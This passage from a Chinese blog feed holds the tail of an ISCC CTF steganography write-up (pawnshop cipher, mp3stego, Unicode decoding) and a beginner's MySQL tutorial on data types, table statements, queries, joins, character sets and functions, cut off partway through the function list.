src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvNzI5ZTU5ZjY5YWMyY2YzMC5wbmc" alt></p><p>扫描得到</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvM2Q5NzkwNTFhMmE4ZTg0Ni5qcGc" alt></p><p>百度查询发现这是当铺密码，于是当铺密码解密得</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvOGNmNTNkNTkxNzJhN2JhYy5qcGc" alt></p><p><strong>即`201902252228</strong>`</p><p>然后找寻其他有用信息，发现把得到的二维码用winrar打开，得到01.mp3音频文件。想到这应该就是音频隐写了。。。。在百度查询了一些信息，发现了一些有关音频隐写得工具，根据题目，得到了密钥和MP3文件。所以可能要使用<strong>mp3stego</strong>工具，得到最终答案。。。。</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvN2NlZjcyM2FjOTRjZjQ4MC5qcGc" alt></p><p> 得到了个txt文件，打开发现</p><p><img src="http://imgconvert.csdnimg.cn/aHR0cDovL2kyLnRpaW1nLmNvbS82OTAzNzQvZDdiMDNmOWUyM2RmZGE0NC5qcGc" alt></p><p>很明显，这是unicode编码，所以unicode解码得</p><p><img src="http://img-blog.csdnimg.cn/20190716171449955.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到最终flag了，开心！！！</p><p>ISCC杂项题(MISC)总算总结完毕，感觉又学到了很多知识。<br>继续努力，小白进阶ing！！！！</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
            <tag> ISCC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web开发-PHP基础篇(四)</title>
      <link href="/2019/05/04/Web%E5%BC%80%E5%8F%91-PHP%E5%9F%BA%E7%A1%80%E7%AF%87(%E5%9B%9B)/"/>
      <url>/2019/05/04/Web%E5%BC%80%E5%8F%91-PHP%E5%9F%BA%E7%A1%80%E7%AF%87(%E5%9B%9B)/</url>
      
        <content type="html"><![CDATA[<h3 id="一、数据库基本概念"><a href="#一、数据库基本概念" class="headerlink" title="一、数据库基本概念"></a>一、数据库基本概念</h3><p><strong>数据库：</strong>信息存储的仓库，包括一系列的关系措施！<br><strong>表:</strong>一个数据库中可以有若干张表（形式上你可以看出我们日常生活中建立的表）<br><strong>字段:</strong>表里面的信息会分若干个栏目来存，这些栏目，在数据库技术中叫”字段”,栏目里面存的具体信息叫”字段值”<br><strong>记录：</strong>一条信息我们叫一条记录<br>一个数据库管理系统中可以建立若干个数据库，每个数据库中又可以建立若干张表,每张表中可以有若干条记录。</p><h3 id="二、MySQL支持的数据类型"><a href="#二、MySQL支持的数据类型" class="headerlink" title="二、MySQL支持的数据类型"></a>二、MySQL支持的数据类型</h3><p>MySQL数据库中的数据类型主要分为：数值类型、日期类型、字符串类型。</p><p><strong>1.数值类型</strong><br>1)整数类型<br>tinyint、smallint、mediumint、int和bigint<br>2)zerofill属性<br>配合int(数字)来用，表示显示的时候一个显示宽度<br>3)主键<br>主键可以唯一标识某条记录的一个字段或者多个字段<br>create table 表名(字段名称 类型 primary key,….);<br>create table 表名(字段名称1 类型,….,primary key(字段名称1));<br>删除：<br>alter table 表名 drop primary key;<br>注意：如果字段具有auto_increment属性必须先删除auto_increment属性<br>4)小数的表示<br>①浮点数<br>单精度(float):单精度的浮点数精确到大约7位小数位(整数部分加上小数部分的位数)<br>双精度精度(double):双精度的浮点数精确到大约15位小数位(整数部分加上小数部分的位数)<br>②定点数<br>decimal(7,2)</p><p><strong>*<u>整数类型的字段常见的属性设置*</u></strong></p><p><em>1.UNSIGNED 无符号</em><br><em>2.auto_increment</em><br>自增(默认从1开始)，用于整数类型和带索引的字段，比如：配合主键使用（其他类型的索引我们以后再说）<br><em>3.主键：</em><br>主键可以唯一标识某条记录的一个字段或者多个字段<br>    一个字段设为主键<br>    多个字段组合设为主键<br>注意点：<br>    1)主键最好不要设置在某个与实际信息相关的字段上，主键的作用应该明确且单一<br>    2)主键最好设置在整数类型的字段上面（处理或查询起来效率较高）<br>    3)主键必须不同，并且不能为null<br>    4)既然主键必须不同所以我们会配合 auto_increment属性<br>    5)一个表只能有一个主键，最好只设置在一个字段上<br>    6)根据主键的值来查询记录时可以获得极快的速度（因为设置了主键的字段已经创建了索引）！<br>设置方法：<br>    在创建表的时候<br>        primary key(字段)<br>        primary key(字段1,字段2)<br>        也可以直接写在需要创建主键的字段后面</p><pre><code class="sql">如果忘了设置可以    alter table 表名 add primary key(字段名);</code></pre><p>删除：</p><pre><code class="sql">    alter table 表名 drop primary key;</code></pre><p>​    注意：如果字段具有auto_increment属性必须先删除auto_increment属性<br><em>4.规定字段的值是否可以为null</em>    not null即不可以为null，该属性也可用于其他类型的字段<br><em>5.设置默认值</em>    default 值，该属性也可用于其他类型的字段</p><p><strong>2.日期类型</strong><br>DATETIME是常用的日期类型<br>create table t1(dt datetime);<br>insert into t1 values(now());<br><strong>3.字符串类型</strong><br>CHAR(M)                M为0~255之间的整数,表示可以存M个字符(不管是中文还是英文字符总共个数是M个就OK)</p><p>VARCHAR(M)            M为0<del>65535之间的整数,表示可以存M个字符,具体M最大多大和字符集有密切关系<br>注意varchar列的最大的存储空间是65,532字节,如果是英文字符集(一个英文字符占1个字节)就是可以放65532个英文字符<br>自己在实际开发的过程中M设置的值，应该从自己的实际需求去考虑，而不是最大能存多少个字符，因为超过最大能设定的字符数会自动报错或者警告！<br>TINYTEXT            允许长度0</del>255字符<br>TEXT                允许长度0<del>65535字符<br>MEDIUMTEXT            允许长度0</del>16,777,215字符<br>LONGTEXT            允许长度0~4,294,967,295字符</p><p>注意点：<br>char与varchar列的区别<br>char类型的字符所占的存储空间是固定,不管你用的时候存了几个字符，它所占的空间都是你当初设定的字符空间<br>    比如char(255) 哪怕你存的只是1个a，那么它也是站255个字符长度的空间!<br>varchar列所占的存储空间是可变的,根据存入的字符长度来确定实际占多少的空间!<br>    varchar(255) 实际所占的空间就是实际字符的长度+1个字节！<br>    varchar(超过255) 实际所占的空间就是实际字符的长度+2个字节！<br>    更节省空间!<br>在检索时，char列删除尾部的空格，而varchar则保留这些空格。<br>选择：由于char是固定长度，所以它的处理速度比varchar快，但是缺点是浪费存储空间。所以对于那些长度变化不大的数据可以选择此列    </p><h3 id="三、MySQL使用"><a href="#三、MySQL使用" class="headerlink" title="三、MySQL使用"></a>三、MySQL使用</h3><p><strong>SQL分类：</strong></p><p>DDL(Data Definition Languages)语句</p><p>数据定义语句，通过这类语言可以对数据库进行创建删除更改</p><p>DML(Data Manipulation Language)语句</p><p> 数据操纵语句，用于添加、删除、更新和查询数据库记录并检查数据完整性</p><p>DCL(Data Control Language)语句</p><p> 数据控制语句，通过此类语句可以对数据库的相关权限进行设置</p><h4 id="DDL语句"><a href="#DDL语句" class="headerlink" title="DDL语句"></a>DDL语句</h4><h5 id="了解"><a href="#了解" class="headerlink" title="了解"></a>了解</h5><p>1.首先需要登录MySQL， <code>mysql -u用户名 -p</code>敲回车键，然后输入密码</p><p>2.命令结束符用“<code>;</code>”或“<code>\g</code>”</p><p>3.客户端的连接ID,这个数字记录了MySQL服务到目前为止的连接次数；每个新连接都会自动加1 </p><h5 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h5><p><strong>1.创建数据库</strong></p><p>   1&gt;<code>create database 数据库名;</code></p><p>   2&gt;选择要操作的数据库：<code>use 数据库;</code></p><p>   3&gt;查看数据中所有的数据表<code>show tables;</code></p><p>例：</p><pre><code class="sql">mysql&gt; create database myph;Query OK, 1 row affected (0.00 sec)mysql&gt; use myphDatabase changedmysql&gt; show tables;Empty set (0.00 sec)</code></pre><p> <strong>2.删除数据库</strong></p><p>​    <code>drop database 数据库名称;</code></p><pre><code class="sql">mysql&gt; drop database myph;Query OK, 1 row affected (0.01 sec)mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || bts                || challenges         || demo               || myphp              || mysql              || performance_schema || security           |+--------------------+8 rows in set (0.00 sec)</code></pre><p> <strong>3.创建表</strong></p><p><em>1)创建表</em></p><p>​        <code>create table 表名(</code></p><pre><code>  `字段1名 字段1类型  列的约束条件,`  `字段2名 字段2类型  列的约束条件,`  `...`</code></pre><p>​         <code>)</code></p><p>例：</p><pre><code class="sql">mysql&gt; create table user(id int ,name varchar(35),password varchar(40));Query OK, 0 rows affected (0.00 sec)</code></pre><p>列的约束条件部分可以设置很多信息比如，默认值设置：<code>default null</code></p><p><em>2)创建完表之后可以查看表的定义</em></p><p>​    <code>desc 表名;</code></p><p>例：</p><pre><code class="php">mysql&gt; desc user;+----------+-------------+------+-----+---------+-------+| Field    | Type        | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+-------+| id       | int(11)     | YES  |     | NULL    |       || name     | varchar(35) | YES  |     | NULL    |       || password | varchar(40) | YES  |     | NULL    |       |+----------+-------------+------+-----+---------+-------+3 rows in set (0.00 sec)</code></pre><p><em>3)查看创建表的SQL语句</em></p><p>​    <code>show create table 表名 \G</code></p><p>例：</p><pre><code class="sql">mysql&gt; show create table user \G*************************** 1. row ***************************       Table: userCreate Table: CREATE TABLE `user` (  `id` int(11) DEFAULT NULL,  `name` varchar(35) DEFAULT NULL,  `password` varchar(40) DEFAULT NULL) ENGINE=MyISAM DEFAULT CHARSET=utf81 row in set (0.00 sec)</code></pre><p> \G选项使得记录能够按照字段竖向排列，以便更好地显示内容较长的记录，\G后面无需再加分号</p><p><strong>4.删除表</strong></p><p>​    <code>drop table 表名;</code></p><p><strong>5.修改表</strong></p><p><em>1)修改表类型</em></p><p>​    <code>alter table 表名 modify [column] 字段定义  [first|after 字段名];</code></p><p>例：</p><pre><code class="sql">mysql&gt; alter table user modify column name tinyint;Query OK, 0 rows affected (0.01 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; desc user;+----------+-------------+------+-----+---------+-------+| Field    | Type        | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+-------+| id       | int(11)     | YES  |     | NULL    |       || name     | tinyint(4)  | YES  |     | NULL    |       || password | varchar(40) | YES  |     | NULL    |       |+----------+-------------+------+-----+---------+-------+</code></pre><p><em>2)增加表字段</em></p><p>​    <code>alter table 表名 add [column] 字段定义 [first|after 字段名];</code></p><p>例：</p><pre><code class="sql">mysql&gt; alter table user add column wer int;Query OK, 0 rows affected (0.02 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; desc user;+----------+-------------+------+-----+---------+-------+| Field    | Type        | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+-------+| id       | int(11)     | YES  |     | NULL    |       || name     | tinyint(4)  | YES  |     | NULL    |       || password | varchar(40) | YES  |     | NULL    |       || wer      | int(11)     | YES  |     | NULL    |       |+----------+-------------+------+-----+---------+-------+4 rows in set (0.00 sec)</code></pre><p><em>3)删除表字段</em></p><p>​    <code>alter table 表名 drop [column]  字段名;</code></p><p>例：</p><pre><code class="sql">mysql&gt; alter table user drop column name;Query OK, 0 rows affected (0.01 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; desc user;+----------+-------------+------+-----+---------+-------+| Field    | Type        | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+-------+| id       | int(11)     | YES  |     | NULL    |       || password | varchar(40) | YES  |     | NULL    |       || wer      | int(11)     | YES  |     | NULL    |       |+----------+-------------+------+-----+---------+-------+3 rows in set (0.01 sec)</code></pre><p><em>4)字段改名</em></p><p>​     <code>alter table 表名 change [column] 旧的字段名 字段定义 [first|after 字段名];</code></p><p>例：</p><pre><code class="sql">mysql&gt; alter table user change wer qwzf int;Query OK, 0 rows affected (0.01 sec)Records: 0  Duplicates: 0  Warnings: 0mysql&gt; desc user;+----------+-------------+------+-----+---------+-------+| Field    | Type        | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+-------+| id       | int(11)     | YES  |     | NULL    |       || password | varchar(40) | YES  |     | NULL    |       || qwzf     | int(11)     | YES  |     | NULL    |       |+----------+-------------+------+-----+---------+-------+3 rows in set (0.00 sec)</code></pre><p><strong>注：</strong>change与modify都可以修改表的定义，不同的是change后面需要接两次列名，不方便，但是优点是change可以修改字段名称</p><p><em>5)修改字段排列排序</em></p><p>前面介绍的字段增加和修改语法(add/change/modify)中，都有一个可选项first|after 字段名,这个选择可以用来修改</p><p>字段在表中的位置新增的字段默认是加载在表中最后位置，而change/modify 默认都不会改变字段的位置</p><p>注意：<code>change/first|after 字段名</code> 这些关键字都是属于MySQL在标准SQL上的扩展，在其他的数据库上不一定适用</p><p><em>6)更改表名</em></p><p>   <code>alter table 表名 rename [to] 新的表名;</code></p><p>例：</p><pre><code class="sql">mysql&gt; alter table user rename to users;Query OK, 0 rows affected (0.00 sec)mysql&gt; show tables;+----------------+| Tables_in_myph |+----------------+| users          |+----------------+1 row in set (0.00 sec)</code></pre><h4 id="DML语句"><a href="#DML语句" class="headerlink" title="DML语句"></a>DML语句</h4><p>因为之前学习过MySQL的增删改查操作，这一部分可以参考一下我之前的博客，<a href="https://qwzf.github.io/2019/03/15/phpstudy-MySQL%E5%9F%BA%E7%A1%80%E7%AF%87%E4%B8%80/#more">MySQL的简单使用</a></p><p>查询 select * from 表名;<br><strong>1)插入记录</strong><br>   1&gt;插入记录</p><pre><code class="sql">insert into 表名(字段1,字段2,字段3,...,字段n)  values(值1,值2,值3,...,值n);</code></pre><p>也可以不用指定字段名，但是values后面的顺序应该和字段的排序一致<br>    2&gt;一次插入多条记录</p><pre><code class="sql">insert into 表名(字段1,字段2,字段3,...,字段n)values(值1,值2,值3,...,值n),(值1,值2,值3,...,值n),(值1,值2,值3,...,值n);</code></pre><p><strong>2)更新记录</strong><br>   1&gt;更新一个表</p><pre><code class="sql">update 表名 set 字段1=值1,字段2=值2,...字段n=值n [where 条件];</code></pre><p>   2&gt;更新多个表中数据</p><pre><code class="sql">update 表1,表2,...表n set 表1.字段1=表达式1,表n.字段n=表达式n [where 条件];</code></pre><p>注：多表更新更多的用在根据一个表的字段来动态的更新另外一个表的字段<br>简单实例：</p><pre><code class="sql">update t1,t2 set t1.age=2000,t2.age=3000 where t1.id=1 and t2.id=1;                </code></pre><p><strong>3)删除记录</strong><br>   1&gt;删除单表中的数据  </p><pre><code class="sql">delete from 表名 [where 条件];</code></pre><p>   2&gt;删除多个表中的数据</p><pre><code class="sql">delete 表1,表2,...表n from 表1,表2,...表n [where 条件];</code></pre><p>不管是单表还是多表，不加where条件将会把表中的所有记录删除，所以操作时一定要小心。</p><p><strong>4)查询记录</strong></p><pre><code class="sql">select 字段名 from 表名;</code></pre><pre><code class="sql">mysql&gt; use demo;Database changedmysql&gt; select username from users;+----------+| username |+----------+| admin    || 69       |+----------+2 rows in set (0.00 sec)</code></pre><p><u>1&gt;查询不重复的记录</u></p><pre><code class="sql">SELECT distinct field1,field2 FROM 表名;</code></pre><pre><code class="sql">mysql&gt; select distinct id,username from users;+---------+----------+| id      | username |+---------+----------+| 1739701 | admin    || 1739702 | 69       |+---------+----------+2 rows in set (0.00 sec)</code></pre><p>只要field1,field2任何一个字段有不同就会被选择，一般使用distinct,只筛选一个字段。</p><p><u>2&gt;条件查询</u><br>注：条件字段比较符号：<br>    =,&lt;,&gt;,&gt;=,&lt;=,!=等比较运算符<br>    多个条件之间可以使用or and等<br>    where 后面接条件</p><pre><code class="sql">select * from 表名 where 条件</code></pre><p><u>3&gt;排序和限制</u><br><em>排序:</em><br>asc:由低到高，也是默认值    </p><pre><code class="sql">select * from 表名 order by 字段名 asc; #按“字段名”由低到高排序</code></pre><p>desc:由高到底</p><pre><code class="sql">select * from 表名 order by 字段名 desc;#按“字段名”由高到低排序</code></pre><p>例：</p><pre><code class="sql">mysql&gt; select * from users order by id desc;+---------+----------+----------+| Id      | username | password |+---------+----------+----------+| 1739702 | 69       | 69       || 1739701 | admin    | admin    |+---------+----------+----------+2 rows in set (0.00 sec)</code></pre><p>多个字段排序</p><pre><code class="sql">select * from 表名 order by 字段名1 desc,字段名2 desc;</code></pre><p><em>限制:</em><br>在语句的最后面 加上limit 数字1,数字2 来进行查询数量的限制。<br><code>limit 数字1,数字2</code> 数字1代表从第几条记录开启取(是从0开始的)，数字2代表取几条</p><p>例：</p><pre><code class="sql">mysql&gt; select * from users order by id desc limit 0,1;+---------+----------+----------+| Id      | username | password |+---------+----------+----------+| 1739702 | 69       | 69       |+---------+----------+----------+1 row in set (0.00 sec)</code></pre><p><u>4&gt;聚合</u><br>    ①sum求和<br>        select sum(字段名) from 表名;<br>    ②count记录总数<br>        select count(<em>|字段名) from 表名;<br>    ③max最大值<br>        select max(字段名) from 表名;<br>    ④min最小值<br>        select min(字段名) from 表名;<br>    ⑤GROUP BY分类聚合<br>        select 字段2,sum(字段1) from 表名 group by 字段2; 按照字段2，分类聚合<br>    ⑥WITH ROLLUP分类聚合后的结果进行再汇总<br>        select sum(字段1) from 表名 group by 字段2 with rollup;<br>    ⑦HAVING<br>         注意：having和where的区别在于，having是对聚合后的结果进行条件过滤，而where是在聚合前就对记录进行过滤 ，应该尽可能的对记录进行先过滤.。<br>        select sum(字段1) from 表名 group by 字段2 having sum(字段1)&gt;1000;<br>可以在一起使用：select sum(id),max(id),min(id),count(</em>) from a1;</p><p><u>5&gt;表连接</u><br><strong>需求：显示多个表中的字段的时候即可使用表连接</strong><br>连接分类：<br>    内连接：选取两张表中相互匹配的记录<br>    外连接：不仅仅选取两张相互匹配的记录，并且会选出其他不匹配的记录<br>举例：<br>内连接：</p><pre><code class="sql">select 表.字段,....  from 表1名,表2名,...  where [匹配的条件比如 表1.字段=表2.字段];</code></pre><p>例：</p><pre><code class="sql">mysql&gt; select*from user,student where user.id=student.id;+----+-------+----------+----+------+------+| Id | name  | password | Id | sex  | ming |+----+-------+----------+----+------+------+|  1 | ad    | ad       |  1 | wa   | wang ||  2 | admin | admin    |  2 | me   | meng ||  3 | root  | root     |  3 | ng   | meng |+----+-------+----------+----+------+------+3 rows in set (0.00 sec)</code></pre><pre><code class="sql">mysql&gt; select user.id,user.name,student.sex from user,student where user.id=student.id;+----+-------+------+| id | name  | sex  |+----+-------+------+|  1 | ad    | wa   ||  2 | admin | me   ||  3 | root  | ng   |+----+-------+------+3 rows in set (0.00 sec)</code></pre><p>select 语句可以给字段起别名!直接写在需要查询显示的字段的后面就ok<br>​        给表起别名</p><p>例：</p><pre><code class="sql">mysql&gt; select user.id a,student.id b from user,student where user.id=student.id;+---+---+| a | b |+---+---+| 1 | 1 || 2 | 2 || 3 | 3 |+---+---+3 rows in set (0.00 sec)</code></pre><p>外连接<br>​1)左连接(left)：包含左边表中的所有记录(包括右表中没有和它匹配的记录)</p><pre><code class="sql">select 表1,表2 from 表1 left join 表2 on 表1.字段名=表2.字段名;</code></pre><p>2)右连接(right)：包含右边表中的所有记录(包括左表中没有和它匹配的记录)<br>​    左连接和右连接是可以相互转换的<br><u>6&gt;子查询</u><br><strong>需求：一个查询需要另外一个查询的结果参与的时候</strong><br>​用于子查询的关键字:<br>​in<br>​语法：<code>select * from 表1 where id in(select 字段名 from 表2);</code><br>​in 在..里面<br>​注意点 in后面的子语句必须只返回一个字段<br>​若查询结果唯一(只有一条)可以使用=代替in</p><p>not in<br>​与in相反<br>​exists<br>​语法：select语句 where exists(select 语句);<br>​exists：后面那个子语句有没有查询出记录来，如果查询出记录来返回true,否则就是false<br>​并且查询出来的记录的具体的值是NULL也是没有关系,也是返回true.<br>​not exits<br>​与exists相反<br>​      1)select * from 表1 where 表2 in(select 表2 from 字段名);<br>​      2)若查询结果唯一可以使用=代替in<br>​          select * from 表1 where 表2=(select 表2 from 字段名 limit 1);<br><u>7&gt;记录联合</u><br>我们常常会碰到需要将两个表或者多个表的数据按照一定的查询条件查询出来后，将结果合并到一起显示这是就需要用到记录联合<br>多个select 语句用<br>UNION或者UNION ALL隔开即可实现</p><p>例：</p><pre><code class="sql">mysql&gt; select id,name from user union select id,sex from student;+----+-------+| id | name  |+----+-------+|  1 | ad    ||  2 | admin ||  3 | root  ||  4 | wang  ||  1 | wa    ||  2 | me    ||  3 | ng    |+----+-------+7 rows in set (0.00 sec)</code></pre><p>区别： 前者 会将多个查询结果合并后并且进行去除重复后返回<br>​       后者 则直接合并并不去除重复<br>联合的条件：查询的列个数要相等</p><h3 id="四、MySQL数据库字符编码"><a href="#四、MySQL数据库字符编码" class="headerlink" title="四、MySQL数据库字符编码"></a>四、MySQL数据库字符编码</h3><p><strong>1、字符编码概述</strong></p><p>从本质上来说，计算机只能识别二进制代码，因此，不论是计算机程序还是其他被处理的数据，最终都必须转换成二进制，计算机才能认识。为了使计算机不仅能做科学计算，也能处理文字信息，人们想出了给每个文字符号编码以便于计算机识别处理，这就是计算机字符集的由来。</p><p>简单的说字符集就是一套文字符号及编码、比较规则的集合。</p><p><strong>2、汉字常见字符集</strong></p><p><strong>1.GB2312-80:</strong><br>即GB2312，是中华人民共和国国家标准简体中文字符集，全称《信息交换用汉字编码字符集 基本集》，1980年发布，1981年5月1日实施。<br>GB2312编码通行于中国大陆，中国大陆几乎所有的中文系统和国际化的软件都支持GB 2312<br><strong>2.GBK：</strong><br>    汉字内码扩展规范，发布于1995年，在GB2312的基础上做了扩充，且对GB2312完全兼容，但是GBK并不是一个强制性的国家标准，只是一个行业指导规范，并没有强制力，但是由于得到了微软windows95的支持而大为流行</p><p><strong>3、国际编码UTF-8</strong></p><p>是一种针对Unicode的可变长度字符编码，通用性很好。</p><p><strong>4、常用字符集比较</strong></p><p>ACSII：单字节7位编码，最早的奠定性字符集<br>ISO-8859-1/latin1：单字节8位编码，西欧字符集<br>GB2312-80：双字节编码，早期标准<br>GBK：双字节编码，虽然不是国标但是支持的系统很多<br>UTF-32：4个字节编码，UCS-4原始编码，目前很少采用<br>UCS-2：2字节编码，windows2000内部用UCS-2<br>UTF-16：2字节或4字节编码，Java和Windows XP/NT等内部使用UTF-16<br>UTF-8：1~4字节编码，互联网和Unix/Linux广泛支持的Unicode字符集,UTF-8汉字编码需要使用3个字节</p><p><strong>5、MySQL支持的字符集</strong></p><p><strong>1.查看所有可用的字符集</strong><br><code>show character set;</code><br>或者查看information_schema.character_sets，也可以显示所有的字符集和该字符集默认的校队规则</p><p><strong>2.MySQL的字符集包括字符集(character)和校对规则(collation)两个概念。</strong><br>1)字符集用来定义MySQL存储字符串的方式<br>2)校对规则用来定义 字符串比较的方式<br>3)字符集和校对规则是一对多的关系,一个字符集有多个校对规则供你选择!<br>校对规则命名约定：它们以相关的字符集名开始，通常包括一个语言名，并且以 _ci(忽略大小写)、_cs(大小写敏感)或者 _bin(二元，即比较是基于字符编码的值而与language无关)结束。<br>查看字符集的校对规则：<br>show  collation like ‘字符集前缀%’;</p><p><strong>6、MySQL内部的字符集和校对规则设置</strong></p><p>MySQL内部的字符集和校对规则有4个级别的默认设置:服务器级、数据库级、表级和字段级<br><strong>1.服务器字符集和校对规则设置</strong><br>1)在配置文件中设置    </p><pre><code class="sql">[mysqld]character-set-server=utf8</code></pre><p>2)或者在启动项中指定</p><pre><code class="sql">mysqld --character-set-server=utf8</code></pre><p>3)或者在编译的时候指定<br><strong>2.数据库字符集和校对规则设置</strong><br>数据库的字符集和校对规则在创建数据库的时候指定，也可以在创建完数据库后通过alter database命令修改.需要注意的是如果数据库里已经有数据存在，因为修改字符集并不能将<br>已有的数据按照新的字符集进行存放，所以不能通过修改数据库的字符集直接修改数据的内容，需要重新导出，然后修改字符编码再导入来解决！<br>设置数据库字符集的规则如下：<br>1)如果指定了字符集和校对规则，则使用指定的字符集和校对规则<br>2)如果指定了字符集没有指定校对规则，则使用指定字符集的默认校对规则<br>3)如果指定了校对规则但未指定字符集，则使用与该校对规则关联的字符集<br>4)如果没有指定字符集和校对规则，则使用服务器字符集和校对字符集和校对规则作为数据库的字符集和校对规则</p><pre><code class="sql">CREATE DATABASE db_name[[DEFAULT] CHARACTER SET charset_name][[DEFAULT] COLLATE collation_name]</code></pre><pre><code class="sql">ALTER DATABASE db_name[[DEFAULT] CHARACTER SET charset_name][[DEFAULT] COLLATE collation_name]</code></pre><p>查看当前数据库的字符集和校对规则：</p><pre><code class="sql">show variables like &#39;character_set_database&#39;;show variables like &#39;collation_database&#39;;</code></pre><p><strong>3.表字符集和校对规则设置</strong><br>    表的字符集和校对规则在创建表的时候指定，也可以通过alter table 命令进行修改，同样的是如果表中已经有数据那么修改字符集对原来的记录并没有影响，不会按照新的字符集进行存放！<br>    设置表字符集的规则如下：<br>    1)如果指定了字符集和校对规则，则使用指定的字符集和校对规则<br>    2)如果指定了字符集没有指定校对规则，则使用指定字符集的默认校对规则<br>    3)如果指定了校对规则但未指定字符集，则使用与该校对规则关联的字符集<br>    4)如果没有指定字符集和校对规则，则使用数据库字符集和校对字符集和校对规则作为表的字符集和校对规则</p><pre><code class="sql">CREATE TABLE tbl_name (column_list)[DEFAULT CHARACTER SET charset_name [COLLATE collation_name]]</code></pre><pre><code class="sql">ALTER TABLE tbl_name[DEFAULT CHARACTER SET charset_name] [COLLATE collation_name]</code></pre><p><strong>4.字段(列)字符集和校对规则</strong><br>    遇到这种情况概率比较小，这只是MySQL提供给我们一个灵活设置的手段</p><p><strong>7、MySQL连接字符集设置</strong></p><p>连接字符集设置：客户端和服务器之间交互的字符集<br><strong>对于客户端和服务器段的交互操作，MySQL提供了3个不同的参数：</strong><br>1)character_set_client：客户端来源数据使用的字符集<br>2)character_set_connection：连接层字符集<br>3)character_set_results：返回结果字符集<br><strong>知识拓展：</strong>数据在客户端和服务器之间交互的过程中字符集转换的大概过程</p><p>1) MySQL Server收到请求时将请求数据从character_set_client转换为character_set_connection；<br>2) 进行内部操作前将请求数据从character_set_connection转换为内部操作字符集，内部操作字符集的确定方法如下：<br>    1&gt;使用每个数据字段设定的字符集；<br>    2&gt;若上述值不存在，则使用对应数据表设定的字符集；<br>    3&gt;若上述值不存在，则使用对应数据库设定的字符集；<br>    4&gt;若上述值不存在，则使用服务器设定的字符集。<br>3) 将操作结果从内部操作字符集转换为character_set_results。<br>这3个参数设定的字符集应该相同，并且客户端使用的字符集确实是参数character_set_client的值，才可以确保用户的数据可以正确的返回且输出。<br>查看当前设置：<code>show variables like &#39;character_set%&#39;;</code><br><strong>修改：</strong><br>set names 字符集，可以同时修改3个参数的值，对本次有效<br>也可以在配置文件中设置：<br>    [mysql]<br>    default-character-set=字符集<br><strong>修改CMD命令行字符集：</strong><br>    chcp 65001   #换成utf-8代码页（设置为utf-8之后最好手动修改显示字体 ）<br>    chcp 936     #换成默认的gbk</p><p><img src="http://img-blog.csdnimg.cn/20190801133205412.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="五、MySQL中的常见运算符和常用函数"><a href="#五、MySQL中的常见运算符和常用函数" class="headerlink" title="五、MySQL中的常见运算符和常用函数"></a>五、MySQL中的常见运算符和常用函数</h3><h4 id="常见运算符"><a href="#常见运算符" class="headerlink" title="常见运算符"></a>常见运算符</h4><p><strong>1.算数运算符</strong></p><p>  运算符  作用</p><p>  +  加法</p><p>  -  减法</p><p>  *  乘法</p><p>  /,DIV  除法，返回商</p><p>  %,MOD  取余数</p><p><strong>2.比较运算符</strong></p><p>  运算符  作用</p><p>  =  等于</p><p>  &lt;&gt;或!=  不等于</p><p>  &lt;=&gt;  可以用于null值的比较</p><p>  &lt;  小于</p><p>  &lt;=  小于等于</p><p>  &gt;  大于</p><p>  &gt;=  大于等于</p><p>  BETWEEN  存在指定范围</p><p>  IN  存在于指定集合</p><p>  IS NULL  为NULL</p><p>  IS NOT NULL  不为NULL</p><p>  LIKE  通配符匹配</p><p>  REGEXP或RLIKE  正则表达式匹配</p><p><strong>3.逻辑运算符</strong></p><p>  逻辑运算符又称为布尔运算符，用来确认表达式的真和假</p><p>  运算符  作用</p><p>  NOT或!  逻辑非</p><p>  AND或&amp;&amp;  逻辑与</p><p>  OR或||  逻辑或</p><p>  XOR  逻辑异或</p><p><strong>4.运算符的优先级</strong></p><p>  在实际运行的时候，实际上很少有人能够将运算符的优先级熟练记忆</p><p>  很多情况下我们都是用“()”来将需要优先的操作括起来，这样既起到了优先的作用，又使得其他用户看起来更易于理解</p><h4 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h4><p>函数用于SQL语句中<br><strong>1.字符串函数</strong><br>CONCAT(S1,S2,…Sn)    连接S1,S2,…Sn为一个字符串<br>INSERT(str,x,y,instr)    将字符串str从第x位置开始，y个字符长的字符串换位字符串instr<br>LOWER(str)            将字符串str中所有字符变为小写<br>UPPER(str)            将字符串str中所有字符变为大写<br>LEFT(str,x)            返回字符串str最右边的x个字符<br>RIGHT(str,x)            返回字符串str最右边的x个字符<br>LPAD(str,n,pad)        用字符串pad对str最左边进行填充，直到长度为n个字符长度<br>RPAD(str,n,pad)        用字符串pad对str最右边进行填充，直到长度为n个字符长度<br>LTRIM(str)            去掉字符串str左侧的空格<br>RTRIM(str)            去掉字符串str行尾的空格<br>REPEAT(str,x)            返回str重复x次的结果<br>REPLACE(str,a,b)        用字符串b替换字符串str中所有出现的字符串a<br>STRCMP(s1,s2)            比较字符串s1和s2<br>TRIM(str)                